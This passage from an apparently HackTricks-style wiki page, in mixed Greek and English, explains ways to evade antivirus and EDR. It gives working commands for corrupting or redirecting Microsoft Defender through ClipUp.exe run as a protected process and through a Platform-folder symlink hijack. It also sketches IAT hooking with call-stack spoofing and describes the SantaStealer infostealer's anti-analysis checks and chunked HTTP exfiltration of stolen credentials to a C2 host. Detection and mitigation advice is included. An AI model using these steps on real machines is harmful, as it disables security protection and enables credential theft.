- Το target EXE (και οποιαδήποτε φορτωμένα DLLs) πρέπει να είναι υπογεγραμμένα με ένα PPL-capable EKU.
- Η διεργασία πρέπει να δημιουργηθεί με CreateProcess χρησιμοποιώντας τα flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί ένα συμβατό protection level που ταιριάζει με τον signer του binary (π.χ., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για anti-malware signers, `PROTECTION_LEVEL_WINDOWS` για Windows signers). Λανθασμένα επίπεδα θα αποτύχουν κατά τη δημιουργία.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (επιλέγει protection level και προωθεί τα arguments στο target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Πρότυπο χρήσης:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Το υπογεγραμμένο σύστημα binary `C:\Windows\System32\ClipUp.exe` αυτο-εκκινεί και δέχεται μια παράμετρο για να γράψει ένα αρχείο καταγραφής σε ένα μονοπάτι που καθορίζεται από τον καλούντα.
- Όταν εκκινείται ως PPL process, η εγγραφή αρχείου γίνεται με PPL backing.
- Το ClipUp δεν μπορεί να αναλύσει μονοπάτια που περιέχουν κενά· χρησιμοποιήστε 8.3 short paths για να δείξετε σε κανονικά προστατευμένες τοποθεσίες.

8.3 short path helpers
- Λίστα σύντομων ονομάτων: `dir /x` σε κάθε parent directory.
- Εξαγωγή σύντομου μονοπατιού στο cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Εκκινήστε το PPL-capable LOLBIN (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας έναν launcher (π.χ., CreateProcessAsPPL).
2) Περνάτε το ClipUp log-path argument για να αναγκάσετε τη δημιουργία αρχείου σε έναν προστατευμένο AV directory (π.χ., Defender Platform). Χρησιμοποιήστε 8.3 short names αν χρειάζεται.
3) Εάν το στοχευόμενο binary είναι συνήθως ανοιχτό/κλειδωμένο από το AV ενώ τρέχει (π.χ., MsMpEng.exe), προγραμματίστε την εγγραφή στην εκκίνηση πριν ξεκινήσει το AV εγκαθιστώντας μια auto-start service που τρέχει αξιόπιστα νωρίτερα. Επαληθεύστε τη σειρά εκκίνησης με Process Monitor (boot logging).
4) Στην επανεκκίνηση, η εγγραφή με PPL backing γίνεται πριν το AV κλειδώσει τα binaries του, διαφθείροντας το στοχευόμενο αρχείο και εμποδίζοντας την εκκίνηση.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Δεν μπορείτε να ελέγξετε το περιεχόμενο που γράφει το ClipUp πέρα από τη θέση του· το primitive είναι κατάλληλο για corruption παρά για ακριβή injection περιεχομένου.
- Απαιτείται τοπικός admin/SYSTEM για να εγκαταστήσετε/ξεκινήσετε μια υπηρεσία και παράθυρο επανεκκίνησης.
- Ο χρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός; η εκτέλεση κατά την εκκίνηση αποφεύγει file locks.

Detections
- Δημιουργία διεργασίας `ClipUp.exe` με ασυνήθιστα arguments, ειδικά όταν parented από μη-τυπικούς launchers, κατά την εκκίνηση.
- Νέες services configured να auto-start suspicious binaries και να ξεκινούν σταθερά πριν Defender/AV. Ερευνήστε τη δημιουργία/τροποποίηση υπηρεσιών πριν από σφάλματα εκκίνησης του Defender.
- File integrity monitoring στα Defender binaries/Platform directories· απρόβλεπτες δημιουργίες/τροποποιήσεις αρχείων από διεργασίες με protected-process flags.
- ETW/EDR telemetry: αναζητήστε διεργασίες που δημιουργήθηκαν με `CREATE_PROTECTED_PROCESS` και ανώμαλη χρήση επιπέδου PPL από non-AV binaries.

Mitigations
- WDAC/Code Integrity: περιορίστε ποια signed binaries επιτρέπεται να τρέχουν ως PPL και υπό ποια parents· μπλοκάρετε ClipUp invocation εκτός legitimate contexts.
- Service hygiene: περιορίστε τη δημιουργία/τροποποίηση auto-start services και παρακολουθήστε manipulation της σειράς εκκίνησης.
- Βεβαιωθείτε ότι το Defender tamper protection και οι early-launch protections είναι ενεργοποιημένες· ερευνήστε startup errors που υποδεικνύουν corruption δυαδικών αρχείων.
- Σκεφτείτε να απενεργοποιήσετε την 8.3 short-name generation σε volumes που φιλοξενούν security tooling εφόσον είναι συμβατό με το περιβάλλον σας (δοκιμάστε διεξοδικά).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender επιλέγει την πλατφόρμα από την οποία θα τρέξει enumerating υποφακέλους υπό:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Επιλέγει τον υποφάκελο με το υψηλότερο lexicographic version string (π.χ. `4.18.25070.5-0`), και έπειτα ξεκινά τις Defender service processes από εκεί (ενημερώνοντας service/registry paths αντιστοίχως). Αυτή η επιλογή εμπιστεύεται τις directory entries συμπεριλαμβανομένων directory reparse points (symlinks). Ένας administrator μπορεί να το αξιοποιήσει για να ανακατευθύνει τον Defender σε ένα attacker-writable path και να επιτύχει DLL sideloading ή service disruption.

Preconditions
- Local Administrator (απαιτείται για να δημιουργηθούν directories/symlinks υπό τον φάκελο Platform)
- Ικανότητα να κάνετε reboot ή να προκαλέσετε Defender platform re-selection (service restart κατά την εκκίνηση)
- Απαιτούνται μόνο ενσωματωμένα εργαλεία (mklink)

Why it works
- Ο Defender μπλοκάρει writes στους δικούς του φακέλους, αλλά η επιλογή πλατφόρμας εμπιστεύεται τις directory entries και επιλέγει το lexicographically highest version χωρίς να επαληθεύει ότι ο στόχος επιλύεται σε protected/trusted path.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Δημιουργήστε έναν symlink σε directory με υψηλότερη έκδοση μέσα στο Platform που δείχνει στον φάκελό σας:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Επιλογή trigger (συνιστάται επανεκκίνηση):
```cmd
shutdown /r /t 0
```
4) Επαληθεύστε ότι το MsMpEng.exe (WinDefend) εκτελείται από την ανακατευθυνόμενη διαδρομή:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
You should observe the new process path under `C:\TMP\AV\` and the service configuration/registry reflecting that location.

Post-exploitation options
- DLL sideloading/code execution: Drop/replace DLLs που ο Defender φορτώνει από τον application directory του για να execute code στις διεργασίες του Defender. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Remove το version-symlink ώστε στην επόμενη εκκίνηση το configured path να μην επιλυθεί και ο Defender να αποτύχει να ξεκινήσει:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Σημειώστε ότι αυτή η τεχνική δεν παρέχει privilege escalation από μόνη της· απαιτεί admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams μπορούν να μεταφέρουν το runtime evasion έξω από το C2 implant και μέσα στο ίδιο το target module κάνοντας hook τον Import Address Table (IAT) και δρομολογώντας επιλεγμένα APIs μέσω attacker-controlled, position‑independent code (PIC). Αυτό γενικεύει το evasion πέρα από την μικρή επιφάνεια API που πολλά kits εκθέτουν (π.χ., CreateProcessA), και επεκτείνει τις ίδιες προστασίες σε BOFs και post‑exploitation DLLs.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
  - Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
  - Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Εφαρμόστε το patch μετά τα relocations/ASLR και πριν από την πρώτη χρήση του import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Κρατήστε τα wrappers tiny και PIC-safe; resolve the true API via the original IAT value you captured before patching or via LdrGetProcedureAddress.
- Χρησιμοποιήστε RW → RX transitions για PIC και αποφύγετε να αφήνετε writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- Αυτό αποφεύγει ανιχνεύσεις που αναμένουν canonical stacks από Beacon/BOFs προς sensitive APIs.
- Pair with stack cutting/stack stitching techniques to land inside expected frames before the API prologue.

Operational integration
- Προσθέστε τον reflective loader πριν τα post‑ex DLLs ώστε το PIC και τα hooks να αρχικοποιούνται αυτόματα όταν το DLL φορτωθεί.
- Χρησιμοποιήστε ένα Aggressor script για να register target APIs ώστε Beacon και BOFs transparently benefit from the same evasion path without code changes.

Detection/DFIR considerations
- IAT integrity: εγγραφές που resolve σε non‑image (heap/anon) addresses; periodic verification of import pointers.
- Stack anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) illustrates how modern info-stealers blend AV bypass, anti-analysis and credential access in a single workflow.

### Keyboard layout gating & sandbox delay

- A config flag (`anti_cis`) enumerates installed keyboard layouts via `GetKeyboardLayoutList`. If a Cyrillic layout is found, the sample drops an empty `CIS` marker and terminates before running stealers, ensuring it never detonates on excluded locales while leaving a hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Πολυεπίπεδη λογική `check_antivm`

- Variant A περνάει τη λίστα διεργασιών, κάνει hash κάθε όνομα με ένα custom rolling checksum, και το συγκρίνει με ενσωματωμένες blocklists για debuggers/sandboxes· επαναλαμβάνει το checksum πάνω στο όνομα του υπολογιστή και ελέγχει working directories όπως `C:\analysis`.
- Variant B ελέγχει system properties (process-count floor, recent uptime), καλεί `OpenServiceA("VBoxGuest")` για να εντοπίσει VirtualBox additions, και πραγματοποιεί timing checks γύρω από sleeps για να εντοπίσει single-stepping. Οποιοδήποτε hit τερματίζει πριν ξεκινήσουν τα modules.

### Fileless helper + double ChaCha20 reflective loading

- The primary DLL/EXE ενσωματώνει έναν Chromium credential helper που είτε αποθηκεύεται στο δίσκο είτε γίνεται manually mapped in-memory· το fileless mode επιλύει imports/relocations μόνο του ώστε να μη γραφτούν helper artifacts.
- Αυτός ο helper αποθηκεύει ένα second-stage DLL κρυπτογραφημένο δύο φορές με ChaCha20 (two 32-byte keys + 12-byte nonces). Μετά και τις δύο διεργασίες, κάνει reflective load του blob (no `LoadLibrary`) και καλεί exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` προερχόμενα από [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Οι ChromElevator routines χρησιμοποιούν direct-syscall reflective process hollowing για injection σε live Chromium browser, κληρονομούν AppBound Encryption keys, και decrypt passwords/cookies/credit cards απευθείας από SQLite βάσεις δεδομένων παρά την ABE hardening.

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` διατρέχει έναν global `memory_generators` function-pointer πίνακα και spawnάρει ένα thread ανά enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions, κ.λπ.). Κάθε thread γράφει αποτελέσματα σε shared buffers και αναφέρει τον αριθμό αρχείων του μετά από περίπου 45s join window.
- Μόλις τελειώσει, όλα συμπιέζονται με τη statically linked `miniz` library ως `%TEMP%\\Log.zip`. Η `ThreadPayload1` μετά κοιμάται 15s και streamάρει το archive σε 10 MB chunks μέσω HTTP POST στο `http://<C2>:6767/upload`, spoofάροντας ένα browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Κάθε chunk προσθέτει `User-Agent: upload`, `auth: <build_id>`, προαιρετικά `w: <campaign_tag>`, και το τελευταίο chunk επισυνάπτει `complete: true` ώστε το C2 να ξέρει ότι η επανασυναρμολόγηση ολοκληρώθηκε.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
